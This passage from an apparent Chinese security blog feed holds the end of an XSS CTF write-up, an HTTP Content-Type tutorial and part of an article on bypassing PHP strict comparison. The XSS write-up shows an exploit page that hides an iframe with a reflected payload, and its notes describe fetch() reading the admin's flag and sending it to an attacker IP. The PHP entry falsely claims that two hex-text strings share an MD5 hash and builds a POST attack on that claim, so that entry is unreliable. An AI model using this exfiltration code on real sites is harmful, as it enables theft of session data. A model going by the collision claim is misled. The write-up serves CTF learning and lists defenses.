using the /ephemeral endpoint, which reflects the msg parameter.</span></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> targetUrl = <span class="hljs-string">&quot;http://challenge.localhost/ephemeral?msg=&quot;</span> + encodedPayload;</span><br><span class="language-javascript">    </span><br><span class="language-javascript">    <span class="hljs-comment">// Create a hidden iframe to force admin&#x27;s browser to load the target URL and execute the payload.</span></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> iframe = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;iframe&quot;</span>);</span><br><span class="language-javascript">    iframe.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">&quot;none&quot;</span>;</span><br><span class="language-javascript">    iframe.<span class="hljs-property">src</span> = targetUrl;</span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(iframe);</span><br><span class="language-javascript">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>说明：</strong></p><ul><li><p>将 <code>http://10.17.108.216:8888/</code>​ 替换为你攻击机的实际 IP 和监听端口。</p></li><li><p>当管理员（通过 victim 工具登录 admin）访问这个页面时，iframe 会加载 <code>http://challenge.localhost/ephemeral?msg=...</code>​，反射出 XSS 负载。</p></li><li><p>执行后，fetch() 请求会获取到包含 flag 的页面内容，并通过 Image 对象将数据发送到攻击者服务器。</p></li></ul><hr><h3 id="四、防御措施"><a href="#四、防御措施" class="headerlink" title="四、防御措施"></a>四、防御措施</h3><ul><li><strong>输入过滤与输出编码：</strong><br>对所有用户输入进行严格过滤，并在输出时进行适当编码，防止 HTML&#x2F;JS 注入。</li><li><strong>Content Security Policy (CSP)：</strong><br>实施 CSP 可有效限制内嵌脚本的执行，降低 XSS 攻击风险。</li><li><strong>CSRF Token：</strong><br>对敏感操作采用 CSRF token 机制，确保请求来自可信任的页面。</li><li><strong>HttpOnly Cookies：</strong><br>虽然 HttpOnly 可防止 JavaScript 直接访问 Cookie，但不能防止通过 XSS 进行间接的攻击（如 fetch() 读取页面内容）。</li></ul><hr><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>XSS 攻击在 CTF 中非常常见，其形式多样，从简单的弹出框到复杂的 CSRF-to-XSS 链式攻击。通过学习和实践这些技巧，不仅可以提高你在 CTF 中的实战能力，也能加深对 Web 安全原理的理解。希望这篇博客能帮助你了解 XSS 攻击的各种方法及防御措施，并在 CTF 比赛中取得好成绩！</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS</tag>
      
      <tag>安全</tag>
      
      <tag>跨站脚本</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP Content-Type详解</title>
    <link href="/2024/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%20content-type/"/>
    <url>/2024/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%20content-type/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP-content-type"><a href="#HTTP-content-type" class="headerlink" title="HTTP content-type"></a>HTTP content-type</h1><p>Content-Type（内容类型），一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件，这就是经常看到一些 PHP 网页点击的结果却是下载一个文件或一张图片的原因。</p><p>Content-Type 标头告诉客户端实际返回的内容的内容类型。</p><p>语法格式：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/html</span>; <span class="hljs-attr">charset</span><span class="hljs-operator">=</span>utf-<span class="hljs-number">8</span><br><span class="hljs-params">Content-Type:</span> multipart<span class="hljs-symbol">/form-data</span>; <span class="hljs-attr">boundary</span><span class="hljs-operator">=</span>something<br></code></pre></td></tr></table></figure><p>实例：</p><p><img src="/.com//image-20250520030815-5f15wxu.png" alt="image"></p><p>常见的媒体格式类型如下：</p><ul><li>text&#x2F;html ： HTML格式</li><li>text&#x2F;plain ：纯文本格式</li><li>text&#x2F;xml ： XML格式</li><li>image&#x2F;gif ：gif图片格式</li><li>image&#x2F;jpeg ：jpg图片格式</li><li>image&#x2F;png：png图片格式</li></ul><p>以application开头的媒体格式类型：</p><ul><li>application&#x2F;xhtml+xml ：XHTML格式</li><li>application&#x2F;xml： XML数据格式</li><li>application&#x2F;atom+xml ：Atom XML聚合格式</li><li>application&#x2F;json： JSON数据格式</li><li>application&#x2F;pdf：pdf格式</li><li>application&#x2F;msword ： Word文档格式</li><li>application&#x2F;octet-stream ： 二进制流数据（如常见的文件下载）</li><li>application&#x2F;x-www-form-urlencoded ： &lt;form encType=””&gt;中默认的encType，form表单数据被编码为key&#x2F;value格式发送到服务器（表单默认的提交数据的格式）</li></ul><p>另外一种常见的媒体格式是上传文件之时使用的：</p><ul><li>multipart&#x2F;form-data ： 需要在表单中进行文件上传时，就需要使用该格式</li></ul><hr><h2 id="HTTP-content-type-对照表"><a href="#HTTP-content-type-对照表" class="headerlink" title="HTTP content-type 对照表"></a>HTTP content-type 对照表</h2><table><thead><tr><th>文件扩展名</th><th>Content-Type(Mime-Type)</th><th>文件扩展名</th><th>Content-Type(Mime-Type)</th></tr></thead><tbody><tr><td>.*（ 二进制流，不知道下载文件类型）</td><td>application&#x2F;octet-stream</td><td>.tif</td><td>image&#x2F;tiff</td></tr><tr><td>.001</td><td>application&#x2F;x-001</td><td>.301</td><td>application&#x2F;x-301</td></tr><tr><td>.323</td><td>text&#x2F;h323</td><td>.906</td><td>application&#x2F;x-906</td></tr><tr><td>.907</td><td>drawing&#x2F;907</td><td>.a11</td><td>application&#x2F;x-a11</td></tr><tr><td>.acp</td><td>audio&#x2F;x-mei-aac</td><td>.ai</td><td>application&#x2F;postscript</td></tr><tr><td>.aif</td><td>audio&#x2F;aiff</td><td>.aifc</td><td>audio&#x2F;aiff</td></tr><tr><td>.aiff</td><td>audio&#x2F;aiff</td><td>.anv</td><td>application&#x2F;x-anv</td></tr><tr><td>.asa</td><td>text&#x2F;asa</td><td>.asf</td><td>video&#x2F;x-ms-asf</td></tr><tr><td>.asp</td><td>text&#x2F;asp</td><td>.asx</td><td>video&#x2F;x-ms-asf</td></tr><tr><td>.au</td><td>audio&#x2F;basic</td><td>.avi</td><td>video&#x2F;avi</td></tr><tr><td>.awf</td><td>application&#x2F;vnd.adobe.workflow</td><td>.biz</td><td>text&#x2F;xml</td></tr><tr><td>.bmp</td><td>application&#x2F;x-bmp</td><td>.bot</td><td>application&#x2F;x-bot</td></tr><tr><td>.c4t</td><td>application&#x2F;x-c4t</td><td>.c90</td><td>application&#x2F;x-c90</td></tr><tr><td>.cal</td><td>application&#x2F;x-cals</td><td>.cat</td><td>application&#x2F;vnd.ms-pki.seccat</td></tr><tr><td>.cdf</td><td>application&#x2F;x-netcdf</td><td>.cdr</td><td>application&#x2F;x-cdr</td></tr><tr><td>.cel</td><td>application&#x2F;x-cel</td><td>.cer</td><td>application&#x2F;x-x509-ca-cert</td></tr><tr><td>.cg4</td><td>application&#x2F;x-g4</td><td>.cgm</td><td>application&#x2F;x-cgm</td></tr><tr><td>.cit</td><td>application&#x2F;x-cit</td><td>.class</td><td>java&#x2F;*</td></tr><tr><td>.cml</td><td>text&#x2F;xml</td><td>.cmp</td><td>application&#x2F;x-cmp</td></tr><tr><td>.cmx</td><td>application&#x2F;x-cmx</td><td>.cot</td><td>application&#x2F;x-cot</td></tr><tr><td>.crl</td><td>application&#x2F;pkix-crl</td><td>.crt</td><td>application&#x2F;x-x509-ca-cert</td></tr><tr><td>.csi</td><td>application&#x2F;x-csi</td><td>.css</td><td>text&#x2F;css</td></tr><tr><td>.cut</td><td>application&#x2F;x-cut</td><td>.dbf</td><td>application&#x2F;x-dbf</td></tr><tr><td>.dbm</td><td>application&#x2F;x-dbm</td><td>.dbx</td><td>application&#x2F;x-dbx</td></tr><tr><td>.dcd</td><td>text&#x2F;xml</td><td>.dcx</td><td>application&#x2F;x-dcx</td></tr><tr><td>.der</td><td>application&#x2F;x-x509-ca-cert</td><td>.dgn</td><td>application&#x2F;x-dgn</td></tr><tr><td>.dib</td><td>application&#x2F;x-dib</td><td>.dll</td><td>application&#x2F;x-msdownload</td></tr><tr><td>.doc</td><td>application&#x2F;msword</td><td>.dot</td><td>application&#x2F;msword</td></tr><tr><td>.drw</td><td>application&#x2F;x-drw</td><td>.dtd</td><td>text&#x2F;xml</td></tr><tr><td>.dwf</td><td>Model&#x2F;vnd.dwf</td><td>.dwf</td><td>application&#x2F;x-dwf</td></tr><tr><td>.dwg</td><td>application&#x2F;x-dwg</td><td>.dxb</td><td>application&#x2F;x-dxb</td></tr><tr><td>.dxf</td><td>application&#x2F;x-dxf</td><td>.edn</td><td>application&#x2F;vnd.adobe.edn</td></tr><tr><td>.emf</td><td>application&#x2F;x-emf</td><td>.eml</td><td>message&#x2F;rfc822</td></tr><tr><td>.ent</td><td>text&#x2F;xml</td><td>.epi</td><td>application&#x2F;x-epi</td></tr><tr><td>.eps</td><td>application&#x2F;x-ps</td><td>.eps</td><td>application&#x2F;postscript</td></tr><tr><td>.etd</td><td>application&#x2F;x-ebx</td><td>.exe</td><td>application&#x2F;x-msdownload</td></tr><tr><td>.fax</td><td>image&#x2F;fax</td><td>.fdf</td><td>application&#x2F;vnd.fdf</td></tr><tr><td>.fif</td><td>application&#x2F;fractals</td><td>.fo</td><td>text&#x2F;xml</td></tr><tr><td>.frm</td><td>application&#x2F;x-frm</td><td>.g4</td><td>application&#x2F;x-g4</td></tr><tr><td>.gbr</td><td>application&#x2F;x-gbr</td><td>.</td><td>application&#x2F;x-</td></tr><tr><td>.gif</td><td>image&#x2F;gif</td><td>.gl2</td><td>application&#x2F;x-gl2</td></tr><tr><td>.gp4</td><td>application&#x2F;x-gp4</td><td>.hgl</td><td>application&#x2F;x-hgl</td></tr><tr><td>.hmr</td><td>application&#x2F;x-hmr</td><td>.hpg</td><td>application&#x2F;x-hpgl</td></tr><tr><td>.hpl</td><td>application&#x2F;x-hpl</td><td>.hqx</td><td>application&#x2F;mac-binhex40</td></tr><tr><td>.hrf</td><td>application&#x2F;x-hrf</td><td>.hta</td><td>application&#x2F;hta</td></tr><tr><td>.htc</td><td>text&#x2F;x-component</td><td>.htm</td><td>text&#x2F;html</td></tr><tr><td>.html</td><td>text&#x2F;html</td><td>.htt</td><td>text&#x2F;webviewhtml</td></tr><tr><td>.htx</td><td>text&#x2F;html</td><td>.icb</td><td>application&#x2F;x-icb</td></tr><tr><td>.ico</td><td>image&#x2F;x-icon</td><td>.ico</td><td>application&#x2F;x-ico</td></tr><tr><td>.iff</td><td>application&#x2F;x-iff</td><td>.ig4</td><td>application&#x2F;x-g4</td></tr><tr><td>.igs</td><td>application&#x2F;x-igs</td><td>.iii</td><td>application&#x2F;x-iphone</td></tr><tr><td>.img</td><td>application&#x2F;x-img</td><td>.ins</td><td>application&#x2F;x-internet-signup</td></tr><tr><td>.isp</td><td>application&#x2F;x-internet-signup</td><td>.IVF</td><td>video&#x2F;x-ivf</td></tr><tr><td>.java</td><td>java&#x2F;*</td><td>.jfif</td><td>image&#x2F;jpeg</td></tr><tr><td>.jpe</td><td>image&#x2F;jpeg</td><td>.jpe</td><td>application&#x2F;x-jpe</td></tr><tr><td>.jpeg</td><td>image&#x2F;jpeg</td><td>.jpg</td><td>image&#x2F;jpeg</td></tr><tr><td>.jpg</td><td>application&#x2F;x-jpg</td><td>.js</td><td>application&#x2F;x-javascript</td></tr><tr><td>.jsp</td><td>text&#x2F;html</td><td>.la1</td><td>audio&#x2F;x-liquid-file</td></tr><tr><td>.lar</td><td>application&#x2F;x-laplayer-reg</td><td>.latex</td><td>application&#x2F;x-latex</td></tr><tr><td>.lavs</td><td>audio&#x2F;x-liquid-secure</td><td>.lbm</td><td>application&#x2F;x-lbm</td></tr><tr><td>.lmsff</td><td>audio&#x2F;x-la-lms</td><td>.ls</td><td>application&#x2F;x-javascript</td></tr><tr><td>.ltr</td><td>application&#x2F;x-ltr</td><td>.m1v</td><td>video&#x2F;x-mpeg</td></tr><tr><td>.m2v</td><td>video&#x2F;x-mpeg</td><td>.m3u</td><td>audio&#x2F;mpegurl</td></tr><tr><td>.m4e</td><td>video&#x2F;mpeg4</td><td>.mac</td><td>application&#x2F;x-mac</td></tr><tr><td>.man</td><td>application&#x2F;x-troff-man</td><td>.math</td><td>text&#x2F;xml</td></tr><tr><td>.mdb</td><td>application&#x2F;msaccess</td><td>.mdb</td><td>application&#x2F;x-mdb</td></tr><tr><td>.mfp</td><td>application&#x2F;x-shockwave-flash</td><td>.mht</td><td>message&#x2F;rfc822</td></tr><tr><td>.mhtml</td><td>message&#x2F;rfc822</td><td>.mi</td><td>application&#x2F;x-mi</td></tr><tr><td>.mid</td><td>audio&#x2F;mid</td><td>.midi</td><td>audio&#x2F;mid</td></tr><tr><td>.mil</td><td>application&#x2F;x-mil</td><td>.mml</td><td>text&#x2F;xml</td></tr><tr><td>.mnd</td><td>audio&#x2F;x-musicnet-download</td><td>.mns</td><td>audio&#x2F;x-musicnet-stream</td></tr><tr><td>.mocha</td><td>application&#x2F;x-javascript</td><td>.movie</td><td>video&#x2F;x-sgi-movie</td></tr><tr><td>.mp1</td><td>audio&#x2F;mp1</td><td>.mp2</td><td>audio&#x2F;mp2</td></tr><tr><td>.mp2v</td><td>video&#x2F;mpeg</td><td>.mp3</td><td>audio&#x2F;mp3</td></tr><tr><td>.mp4</td><td>video&#x2F;mpeg4</td><td>.mpa</td><td>video&#x2F;x-mpg</td></tr><tr><td>.mpd</td><td>application&#x2F;vnd.ms-project</td><td>.mpe</td><td>video&#x2F;x-mpeg</td></tr><tr><td>.mpeg</td><td>video&#x2F;mpg</td><td>.mpg</td><td>video&#x2F;mpg</td></tr><tr><td>.mpga</td><td>audio&#x2F;rn-mpeg</td><td>.mpp</td><td>application&#x2F;vnd.ms-project</td></tr><tr><td>.mps</td><td>video&#x2F;x-mpeg</td><td>.mpt</td><td>application&#x2F;vnd.ms-project</td></tr><tr><td>.mpv</td><td>video&#x2F;mpg</td><td>.mpv2</td><td>video&#x2F;mpeg</td></tr><tr><td>.mpw</td><td>application&#x2F;vnd.ms-project</td><td>.mpx</td><td>application&#x2F;vnd.ms-project</td></tr><tr><td>.mtx</td><td>text&#x2F;xml</td><td>.mxp</td><td>application&#x2F;x-mmxp</td></tr><tr><td>.net</td><td>image&#x2F;pnetvue</td><td>.nrf</td><td>application&#x2F;x-nrf</td></tr><tr><td>.nws</td><td>message&#x2F;rfc822</td><td>.odc</td><td>text&#x2F;x-ms-odc</td></tr><tr><td>.out</td><td>application&#x2F;x-out</td><td>.p10</td><td>application&#x2F;pkcs10</td></tr><tr><td>.p12</td><td>application&#x2F;x-pkcs12</td><td>.p7b</td><td>application&#x2F;x-pkcs7-certificates</td></tr><tr><td>.p7c</td><td>application&#x2F;pkcs7-mime</td><td>.p7m</td><td>application&#x2F;pkcs7-mime</td></tr><tr><td>.p7r</td><td>application&#x2F;x-pkcs7-certreqresp</td><td>.p7s</td><td>application&#x2F;pkcs7-signature</td></tr><tr><td>.pc5</td><td>application&#x2F;x-pc5</td><td>.pci</td><td>application&#x2F;x-pci</td></tr><tr><td>.pcl</td><td>application&#x2F;x-pcl</td><td>.pcx</td><td>application&#x2F;x-pcx</td></tr><tr><td>.pdf</td><td>application&#x2F;pdf</td><td>.pdf</td><td>application&#x2F;pdf</td></tr><tr><td>.pdx</td><td>application&#x2F;vnd.adobe.pdx</td><td>.pfx</td><td>application&#x2F;x-pkcs12</td></tr><tr><td>.pgl</td><td>application&#x2F;x-pgl</td><td>.pic</td><td>application&#x2F;x-pic</td></tr><tr><td>.pko</td><td>application&#x2F;vnd.ms-pki.pko</td><td>.pl</td><td>application&#x2F;x-perl</td></tr><tr><td>.plg</td><td>text&#x2F;html</td><td>.pls</td><td>audio&#x2F;scpls</td></tr><tr><td>.plt</td><td>application&#x2F;x-plt</td><td>.png</td><td>image&#x2F;png</td></tr><tr><td>.png</td><td>application&#x2F;x-png</td><td>.pot</td><td>application&#x2F;vnd.ms-powerpoint</td></tr><tr><td>.ppa</td><td>application&#x2F;vnd.ms-powerpoint</td><td>.ppm</td><td>application&#x2F;x-ppm</td></tr><tr><td>.pps</td><td>application&#x2F;vnd.ms-powerpoint</td><td>.ppt</td><td>application&#x2F;vnd.ms-powerpoint</td></tr><tr><td>.ppt</td><td>application&#x2F;x-ppt</td><td>.pr</td><td>application&#x2F;x-pr</td></tr><tr><td>.prf</td><td>application&#x2F;pics-rules</td><td>.prn</td><td>application&#x2F;x-prn</td></tr><tr><td>.prt</td><td>application&#x2F;x-prt</td><td>.ps</td><td>application&#x2F;x-ps</td></tr><tr><td>.ps</td><td>application&#x2F;postscript</td><td>.ptn</td><td>application&#x2F;x-ptn</td></tr><tr><td>.pwz</td><td>application&#x2F;vnd.ms-powerpoint</td><td>.r3t</td><td>text&#x2F;vnd.rn-realtext3d</td></tr><tr><td>.ra</td><td>audio&#x2F;vnd.rn-realaudio</td><td>.ram</td><td>audio&#x2F;x-pn-realaudio</td></tr><tr><td>.ras</td><td>application&#x2F;x-ras</td><td>.rat</td><td>application&#x2F;rat-file</td></tr><tr><td>.rdf</td><td>text&#x2F;xml</td><td>.rec</td><td>application&#x2F;vnd.rn-recording</td></tr><tr><td>.red</td><td>application&#x2F;x-red</td><td>.rgb</td><td>application&#x2F;x-rgb</td></tr><tr><td>.rjs</td><td>application&#x2F;vnd.rn-realsystem-rjs</td><td>.rjt</td><td>application&#x2F;vnd.rn-realsystem-rjt</td></tr><tr><td>.rlc</td><td>application&#x2F;x-rlc</td><td>.rle</td><td>application&#x2F;x-rle</td></tr><tr><td>.rm</td><td>application&#x2F;vnd.rn-realmedia</td><td>.rmf</td><td>application&#x2F;vnd.adobe.rmf</td></tr><tr><td>.rmi</td><td>audio&#x2F;mid</td><td>.rmj</td><td>application&#x2F;vnd.rn-realsystem-rmj</td></tr><tr><td>.rmm</td><td>audio&#x2F;x-pn-realaudio</td><td>.rmp</td><td>application&#x2F;vnd.rn-rn_music_package</td></tr><tr><td>.rms</td><td>application&#x2F;vnd.rn-realmedia-secure</td><td>.rmvb</td><td>application&#x2F;vnd.rn-realmedia-vbr</td></tr><tr><td>.rmx</td><td>application&#x2F;vnd.rn-realsystem-rmx</td><td>.rnx</td><td>application&#x2F;vnd.rn-realplayer</td></tr><tr><td>.rp</td><td>image&#x2F;vnd.rn-realpix</td><td>.rpm</td><td>audio&#x2F;x-pn-realaudio-plugin</td></tr><tr><td>.rsml</td><td>application&#x2F;vnd.rn-rsml</td><td>.rt</td><td>text&#x2F;vnd.rn-realtext</td></tr><tr><td>.rtf</td><td>application&#x2F;msword</td><td>.rtf</td><td>application&#x2F;x-rtf</td></tr><tr><td>.rv</td><td>video&#x2F;vnd.rn-realvideo</td><td>.sam</td><td>application&#x2F;x-sam</td></tr><tr><td>.sat</td><td>application&#x2F;x-sat</td><td>.sdp</td><td>application&#x2F;sdp</td></tr><tr><td>.sdw</td><td>application&#x2F;x-sdw</td><td>.sit</td><td>application&#x2F;x-stuffit</td></tr><tr><td>.slb</td><td>application&#x2F;x-slb</td><td>.sld</td><td>application&#x2F;x-sld</td></tr><tr><td>.slk</td><td>drawing&#x2F;x-slk</td><td>.smi</td><td>application&#x2F;smil</td></tr><tr><td>.smil</td><td>application&#x2F;smil</td><td>.smk</td><td>application&#x2F;x-smk</td></tr><tr><td>.snd</td><td>audio&#x2F;basic</td><td>.sol</td><td>text&#x2F;plain</td></tr><tr><td>.sor</td><td>text&#x2F;plain</td><td>.spc</td><td>application&#x2F;x-pkcs7-certificates</td></tr><tr><td>.spl</td><td>application&#x2F;futuresplash</td><td>.spp</td><td>text&#x2F;xml</td></tr><tr><td>.ssm</td><td>application&#x2F;streamingmedia</td><td>.sst</td><td>application&#x2F;vnd.ms-pki.certstore</td></tr><tr><td>.stl</td><td>application&#x2F;vnd.ms-pki.stl</td><td>.stm</td><td>text&#x2F;html</td></tr><tr><td>.sty</td><td>application&#x2F;x-sty</td><td>.svg</td><td>text&#x2F;xml</td></tr><tr><td>.swf</td><td>application&#x2F;x-shockwave-flash</td><td>.tdf</td><td>application&#x2F;x-tdf</td></tr><tr><td>.tg4</td><td>application&#x2F;x-tg4</td><td>.tga</td><td>application&#x2F;x-tga</td></tr><tr><td>.tif</td><td>image&#x2F;tiff</td><td>.tif</td><td>application&#x2F;x-tif</td></tr><tr><td>.tiff</td><td>image&#x2F;tiff</td><td>.tld</td><td>text&#x2F;xml</td></tr><tr><td>.top</td><td>drawing&#x2F;x-top</td><td>.torrent</td><td>application&#x2F;x-bittorrent</td></tr><tr><td>.tsd</td><td>text&#x2F;xml</td><td>.txt</td><td>text&#x2F;plain</td></tr><tr><td>.uin</td><td>application&#x2F;x-icq</td><td>.uls</td><td>text&#x2F;iuls</td></tr><tr><td>.vcf</td><td>text&#x2F;x-vcard</td><td>.vda</td><td>application&#x2F;x-vda</td></tr><tr><td>.vdx</td><td>application&#x2F;vnd.visio</td><td>.vml</td><td>text&#x2F;xml</td></tr><tr><td>.vpg</td><td>application&#x2F;x-vpeg005</td><td>.vsd</td><td>application&#x2F;vnd.visio</td></tr><tr><td>.vsd</td><td>application&#x2F;x-vsd</td><td>.vss</td><td>application&#x2F;vnd.visio</td></tr><tr><td>.vst</td><td>application&#x2F;vnd.visio</td><td>.vst</td><td>application&#x2F;x-vst</td></tr><tr><td>.vsw</td><td>application&#x2F;vnd.visio</td><td>.vsx</td><td>application&#x2F;vnd.visio</td></tr><tr><td>.vtx</td><td>application&#x2F;vnd.visio</td><td>.vxml</td><td>text&#x2F;xml</td></tr><tr><td>.wav</td><td>audio&#x2F;wav</td><td>.wax</td><td>audio&#x2F;x-ms-wax</td></tr><tr><td>.wb1</td><td>application&#x2F;x-wb1</td><td>.wb2</td><td>application&#x2F;x-wb2</td></tr><tr><td>.wb3</td><td>application&#x2F;x-wb3</td><td>.wbmp</td><td>image&#x2F;vnd.wap.wbmp</td></tr><tr><td>.wiz</td><td>application&#x2F;msword</td><td>.wk3</td><td>application&#x2F;x-wk3</td></tr><tr><td>.wk4</td><td>application&#x2F;x-wk4</td><td>.wkq</td><td>application&#x2F;x-wkq</td></tr><tr><td>.wks</td><td>application&#x2F;x-wks</td><td>.wm</td><td>video&#x2F;x-ms-wm</td></tr><tr><td>.wma</td><td>audio&#x2F;x-ms-wma</td><td>.wmd</td><td>application&#x2F;x-ms-wmd</td></tr><tr><td>.wmf</td><td>application&#x2F;x-wmf</td><td>.wml</td><td>text&#x2F;vnd.wap.wml</td></tr><tr><td>.wmv</td><td>video&#x2F;x-ms-wmv</td><td>.wmx</td><td>video&#x2F;x-ms-wmx</td></tr><tr><td>.wmz</td><td>application&#x2F;x-ms-wmz</td><td>.wp6</td><td>application&#x2F;x-wp6</td></tr><tr><td>.wpd</td><td>application&#x2F;x-wpd</td><td>.wpg</td><td>application&#x2F;x-wpg</td></tr><tr><td>.wpl</td><td>application&#x2F;vnd.ms-wpl</td><td>.wq1</td><td>application&#x2F;x-wq1</td></tr><tr><td>.wr1</td><td>application&#x2F;x-wr1</td><td>.wri</td><td>application&#x2F;x-wri</td></tr><tr><td>.wrk</td><td>application&#x2F;x-wrk</td><td>.ws</td><td>application&#x2F;x-ws</td></tr><tr><td>.ws2</td><td>application&#x2F;x-ws</td><td>.wsc</td><td>text&#x2F;scriptlet</td></tr><tr><td>.wsdl</td><td>text&#x2F;xml</td><td>.wvx</td><td>video&#x2F;x-ms-wvx</td></tr><tr><td>.xdp</td><td>application&#x2F;vnd.adobe.xdp</td><td>.xdr</td><td>text&#x2F;xml</td></tr><tr><td>.xfd</td><td>application&#x2F;vnd.adobe.xfd</td><td>.xfdf</td><td>application&#x2F;vnd.adobe.xfdf</td></tr><tr><td>.xhtml</td><td>text&#x2F;html</td><td>.xls</td><td>application&#x2F;vnd.ms-excel</td></tr><tr><td>.xls</td><td>application&#x2F;x-xls</td><td>.xlw</td><td>application&#x2F;x-xlw</td></tr><tr><td>.xml</td><td>text&#x2F;xml</td><td>.xpl</td><td>audio&#x2F;scpls</td></tr><tr><td>.xq</td><td>text&#x2F;xml</td><td>.xql</td><td>text&#x2F;xml</td></tr><tr><td>.xquery</td><td>text&#x2F;xml</td><td>.xsd</td><td>text&#x2F;xml</td></tr><tr><td>.xsl</td><td>text&#x2F;xml</td><td>.xslt</td><td>text&#x2F;xml</td></tr><tr><td>.xwd</td><td>application&#x2F;x-xwd</td><td>.x_b</td><td>application&#x2F;x-x_b</td></tr><tr><td>.sis</td><td>application&#x2F;vnd.symbian.install</td><td>.sisx</td><td>application&#x2F;vnd.symbian.install</td></tr><tr><td>.x_t</td><td>application&#x2F;x-x_t</td><td>.ipa</td><td>application&#x2F;vnd.iphone</td></tr><tr><td>.apk</td><td>application&#x2F;vnd.android.package-archive</td><td>.xap</td><td>application&#x2F;x-silverlight-app</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>HTTP教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTTP</tag>
      
      <tag>Content-Type</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP强比较漏洞</title>
    <link href="/2024/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/%E5%BC%BA%E6%AF%94%E8%BE%83/"/>
    <url>/2024/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/%E5%BC%BA%E6%AF%94%E8%BE%83/</url>
    
    <content type="html"><![CDATA[<h1 id="强比较"><a href="#强比较" class="headerlink" title="强比较"></a>强比较</h1><h2 id="1-MD5-碰撞（Collision-Attack）"><a href="#1-MD5-碰撞（Collision-Attack）" class="headerlink" title="1. MD5 碰撞（Collision Attack）"></a><strong>1. MD5 碰撞（Collision Attack）</strong></h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h3><p>MD5 算法存在碰撞漏洞，即两个不同的输入可以生成相同的 MD5 哈希值。<br><strong>适用于</strong> <code>md5($a) === md5($b)</code>​ 且 <code>$a !== $b</code>​ 的情况。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a><strong>示例</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;240610708&quot;</span>;  <span class="hljs-comment">// md5: 0e462097431906509019562988736854</span><br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;QNKCDZO&quot;</span>;    <span class="hljs-comment">// md5: 0e830400451993494058024219903391</span><br></code></pre></td></tr></table></figure><p>虽然这两个字符串的 MD5 都以 <code>0e</code>​ 开头，但严格比较（<code>===</code>​）仍然会检查整个字符串，因此 <strong>需要找到真正的 MD5 碰撞</strong>。</p><h3 id="已知-MD5-碰撞对"><a href="#已知-MD5-碰撞对" class="headerlink" title="已知 MD5 碰撞对"></a><strong>已知 MD5 碰撞对</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$collision1</span> = <span class="hljs-string">&quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&quot;</span>;<br><span class="hljs-variable">$collision2</span> = <span class="hljs-string">&quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&quot;</span>;<br></code></pre></td></tr></table></figure><p>这两个字符串的 MD5 完全相同：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$collision1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$collision2</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>攻击方式</strong>：</p><ul><li><p>构造 <code>POST</code>​ 请求，提交这两个字符串：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/target.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-apache"><span class="hljs-attribute">wqh</span>=<span class="hljs-number">4</span>dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&amp;dsy=<span class="hljs-number">4</span>dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2</span><br></code></pre></td></tr></table></figure></li><li><p>这样 <code>md5($wqh) === md5($dsy)</code>​ 成立，且 <code>$wqh !== $dsy</code>​。</p></li></ul><hr><h2 id="2-数组绕过（Array-Bypass）"><a 